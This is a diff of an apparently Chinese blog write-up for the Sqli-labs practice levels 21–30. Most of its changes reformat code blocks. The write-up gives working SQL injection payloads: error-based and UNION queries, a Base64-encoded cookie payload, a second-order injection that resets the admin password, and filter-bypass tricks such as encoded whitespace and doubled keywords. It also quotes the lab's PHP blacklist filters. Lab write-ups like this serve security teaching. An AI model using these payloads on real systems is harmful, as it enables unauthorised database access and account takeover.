@@ -89,13 +89,13 @@ Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且�
                 
                 <span>
                     <b class="iconfont icon-text2"></b> <i>Words count</i>
-                    20k
+                    11k
                 </span>
                 
                 
                 <span>
                     <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
-                    19 mins.
+                    10 mins.
                 </span>
                 
                 
@@ -139,28 +139,35 @@ Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且�
 <h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>与前面关卡类似，只是对<code>$cookee</code>包括采用了<code>双引号</code></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-1.png" alt="2-1"></p>
 <p><code>Base64</code>加密一下<code>payload</code>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))#</span><br><span class="line"></span><br><span class="line">加密后：</span><br><span class="line">IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgd2hlcmUgaWQ9MiksMHg3ZSkpIw</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-2.png" alt="2-2"></p>
+<pre><code>&quot; and extractvalue(1,concat(0x7e,(select group_concat(username,password) from users where id=2),0x7e))#
+
+加密后：
+IiBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgd2hlcmUgaWQ9MiksMHg3ZSkpIw
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/2-2.png" alt="2-2"></p>
 <h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><p>查看源代码，本关将注释符：<code>#、--</code>进行了过滤，查询语句是通过<code>单引号</code>来包裹<code>$id</code>的</p>
 <p>所以只需要将结尾的单引号处理掉就好了</p>
 <p>爆表名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,（select group_concat(table_name) from information_schema.tables where table_schema=database()）,3 and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/3-1.png" alt="3-1"></p>
+<pre><code>?id=-1&#39; union select 1,（select group_concat(table_name) from information_schema.tables where table_schema=database()）,3 and &#39;1&#39;=&#39;1
+</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/3-1.png" alt="3-1"></p>
 <p>其他的语句自行构造，不再赘述</p>
 <h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><p>本关考察<code>二次排序注入（二次注入、存储型注入）</code></p>
 <p>查看本关源代码</p>
 <p><code>创建用户</code>时的语句为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)</span><br></pre></td></tr></table></figure>
+<pre><code class="mysql">insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)
+</code></pre>
 <p><code>修改密码</code>时的语句为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
+<pre><code class="mysql">UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39;
+</code></pre>
 <p>结题思路：</p>
 <p>创建一个用户，名为<code>admin&#39;#</code>，密码随意，数据库执行以下语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into users ( username, password) values(\&quot;admin&apos;#\&quot;, \&quot;666\&quot;)</span><br></pre></td></tr></table></figure>
+<pre><code class="mysql">insert into users ( username, password) values(\&quot;admin&#39;#\&quot;, \&quot;666\&quot;)
+</code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-1.png" alt="4-1"></p>
 <p>返回首页，<code>登陆</code>这个新注册的<code>admin&#39;#</code>用户</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-2.png" alt="4-2"></p>
 <p>登陆成功，可以直接<code>修改密码</code>，数据库执行了以下语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos;# and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
+<pre><code class="mysql">UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;# and password=&#39;$curr_pass&#39;
+</code></pre>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-3.png" alt="4-3"></p>
 <p>此时<code>admin</code>用户的密码已经改成我们修改的那个密码了，可以直接登录</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/4-4.png" alt="4-4"></p>
@@ -173,46 +180,118 @@ Less-21与Less-20类似，只是对变量Cookiee进行了Base64加密，并且�
 <p>其他和Less-25一样</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/21-30/5-2.png" alt="5-2"></p>
 <h2 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h2><p>过滤规则，过滤了：<code>or、and、/、*、--、#、\s空格、/、\\</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">function blacklist($id)
+{
+    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
+    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
+    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
+    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --
+    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #
+    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        //Strip out spaces
+    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        //Strip out slashes
+    return $id;
+}
+</code></pre>
 <p>（1）<code>or</code>和<code>and</code>的绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">or：用||代替</span><br><span class="line">and:用&amp;&amp;代替</span><br></pre></td></tr></table></figure>
-<p>（2）<code>空格</code>的绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09：tab键（水平）</span><br><span class="line">%0b：tab键（垂直）</span><br><span class="line">%0a：新建一行</span><br><span class="line">%0c：新的一页</span><br><span class="line">%0d：return功能</span><br><span class="line">%a0：空格</span><br></pre></td></tr></table></figure>
-<p>由于<code>井号#</code>和<code>--</code>被过滤的，只能用<code>||&#39;1</code>处理掉末尾的单引号</p>
+<pre><code>or：用||代替
+and:用&amp;&amp;代替
+</code></pre><p>（2）<code>空格</code>的绕过</p>
+<pre><code>%09：tab键（水平）
+%0b：tab键（垂直）
+%0a：新建一行
+%0c：新的一页
+%0d：return功能
+%a0：空格
+</code></pre><p>由于<code>井号#</code>和<code>--</code>被过滤的，只能用<code>||&#39;1</code>处理掉末尾的单引号</p>
 <p>不过我的环境好像不能使用上面的几种变换绕过空格，但是从27关开始又可以</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;%0aunion%0aselect%0a1,2,3%0a||%0a&apos;1</span><br></pre></td></tr></table></figure>
-<h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>本关与前一关的区别在于，关闭了mysql报错</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></table></figure>
+<pre><code>?id=0&#39;%0aunion%0aselect%0a1,2,3%0a||%0a&#39;1
+</code></pre><h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>本关与前一关的区别在于，关闭了mysql报错</p>
+<pre><code class="php">$sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;
+
+//print_r(mysql_error());
+</code></pre>
 <p>其他与前一关保持一致</p>
 <h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>过滤规则：</p>
 <p>这里解释一下<code>/m</code>和<code>/s</code>的用法：</p>
 <p>/m：当设定了此修正符，行起始和行结束除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</p>
 <p>/s：如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out Select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">function blacklist($id)
+{
+$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union
+$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select
+$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION
+$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT
+$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union
+$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out Select
+return $id;
+}
+</code></pre>
 <p>过滤<code>union</code>和<code>select</code>前面的关卡已经用过了，我们这里同理，用双写就可以绕过</p>
 <p>值得注意的是这里的<code>id</code>不能再赋值为负数，因为出来的结果中-1会等于1，-2会等于2，以此类推，所以此处使用0就可以</p>
 <p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;%0auniunionon%0aSeLeCt%0b1,2,3%0a||&apos;1</span><br></pre></td></tr></table></figure>
-<h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>本关与前一关的区别在于，关闭了mysql报错</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br></pre></td></tr></table></figure>
+<pre><code>?id=0&#39;%0auniunionon%0aSeLeCt%0b1,2,3%0a||&#39;1
+</code></pre><h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>本关与前一关的区别在于，关闭了mysql报错</p>
+<pre><code class="php">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;
+
+//print_r(mysql_error());
+</code></pre>
 <p>其他与前一关保持一致</p>
 <p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&quot;%0aunion%0aSeLect%0a1,2,3%0a||%0a&quot;1</span><br></pre></td></tr></table></figure>
-<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>过滤规则：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);				<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);					<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   		 //Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>?id=0&quot;%0aunion%0aSeLect%0a1,2,3%0a||%0a&quot;1
+</code></pre><h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>过滤规则：</p>
+<pre><code class="php">function blacklist($id)
+{
+$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);                //Strip out --.
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);                    //Strip out #.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.
+//$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);                //Strip out spaces.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.
+$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);        //Strip out UNION &amp; SELECT.
+return $id;
+}
+</code></pre>
 <p>本关不单独过滤<code>union</code>或<code>select</code>单词，而是过滤<code>union select</code>这个整体</p>
 <p>解决办法就是同样的道理，双写就行</p>
 <p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;)%0aunion%0aunion%0aselectselect%0a1,2,3%0a||%0a(&apos;1</span><br></pre></td></tr></table></figure>
-<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>过滤规则：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$id= preg_replace('/[\/\*]/',"", $id);				//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[--]/',"", $id);				//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[#]/',"", $id);					//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/select/m',"", $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace('/[ +]/',"", $id);	    		//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>?id=0&#39;)%0aunion%0aunion%0aselectselect%0a1,2,3%0a||%0a(&#39;1
+</code></pre><h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>过滤规则：</p>
+<pre><code class="php">function blacklist($id)
+{
+//$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);                //strip out /*
+//$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);                //Strip out --.
+//$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);                    //Strip out #.
+//$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.
+//$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);                    //Strip out spaces.
+//$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);                //Strip out spaces.
+$id= preg_replace(&#39;/union\s+select/i&#39;,&quot;&quot;, $id);        //Strip out spaces.
+return $id;
+}
+</code></pre>
 <p>这里注意到其他规则已经注释掉，只过滤<code>union select</code>这个整体</p>
 <p>过滤规则更少更简单了，前一关的payload可以继续使用，当然也可以使用更简单的</p>
 <p>payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos;) union union selectselect 1,2,3--+</span><br></pre></td></tr></table></figure>
-<h2 id="Less-29至31"><a href="#Less-29至31" class="headerlink" title="Less-29至31"></a>Less-29至31</h2><p>这一部分训练的是HPP（HTTP Parameter Pollution），俗称HTTP参数污染。</p>
+<pre><code>?id=0&#39;) union union selectselect 1,2,3--+
+</code></pre><h2 id="Less-29至31"><a href="#Less-29至31" class="headerlink" title="Less-29至31"></a>Less-29至31</h2><p>这一部分训练的是HPP（HTTP Parameter Pollution），俗称HTTP参数污染。</p>
 <p>开始看这题并没有发现index.php有WAF，后来发现原来是index.jsp用了WAF，关键代码如下。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    String id = request.getParameter(<span class="string">"id"</span>);</span><br><span class="line">    String qs = request.getQueryString();</span><br><span class="line">    String rex = <span class="string">"^\\d+$"</span>;</span><br><span class="line">    Boolean match=id.matches(rex);</span><br><span class="line">    <span class="keyword">if</span>(match == <span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        URL sqli_labs = <span class="keyword">new</span> URL(<span class="string">"http://localhost/sqli-labs/Less-29/index.php?"</span>+ qs);</span><br><span class="line">        URLConnection sqli_labs_connection = sqli_labs.openConnection();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">&lt;%
+    String id = request.getParameter(&quot;id&quot;);
+    String qs = request.getQueryString();
+    String rex = &quot;^\\d+$&quot;;
+    Boolean match=id.matches(rex);
+    if(match == true)
+    {
+        URL sqli_labs = new URL(&quot;http://localhost/sqli-labs/Less-29/index.php?&quot;+ qs);
+        URLConnection sqli_labs_connection = sqli_labs.openConnection();
+    }
+%&gt;
+</code></pre>
 <p>至此，21-30关的Write-up结束</p>
 <p>后一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/01/Sqli-labs%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></p>
 
